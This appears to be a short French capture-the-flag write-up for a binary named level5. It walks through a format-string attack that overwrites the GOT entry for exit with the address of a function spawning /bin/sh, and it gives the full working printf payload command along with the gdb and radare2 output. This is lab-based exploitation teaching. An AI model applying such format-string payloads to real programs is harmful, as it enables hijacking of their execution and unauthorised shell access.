Dans ce niveau ```(gdb) i f``` nous donne 3 fonctions ```main``` qui call ```n``` et une fonction ```o```

On va chercher ou le retour de fgets est stocke ```AAAA %x %x %x %x %x %x %x``` on le trouve en 4eme pos

On va noter l'adresse de la fonction ```o``` car on voit un appel system ```/bin/sh``` = ```0x080484a4  o```

Notre but va etre de remplacer la fonction ```exit``` par la fonction ```o``` a l'adresse GOT(l'adresse reelle) de ```exit```

```sh
0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```
On va donc chercher l'adresse GOT de exit dans radar on a ```0x080483d0    1      6 sym.imp.exit```

Avec la commande ```pdf @ sym.imp.exit``` on voit l'adresse appele pour exit ```0x8049838```
    (On peut la recuperer aussi avec : ```objdump -R ./level5 | grep exit```)

On va sortir convertir l'adresse de ```o``` et enlever les 4 octets de l'adresse de ```exit```: ```0x080484a4 = 134513828 - 4 = 134513824```

Et ecrire l'adresse de ```exit``` en little-endian

Nous pouvons encore exploiter printf avec ```(python -c 'print "\x38\x98\x04\x08" + "%134513824c%4$n"' && cat) | ./level5```

Avec ```%4$n``` printf ecris le compteur de caracteres total imprime jusque-la (134513828) a l’adresse qu'il a reçu en 4ᵉ argument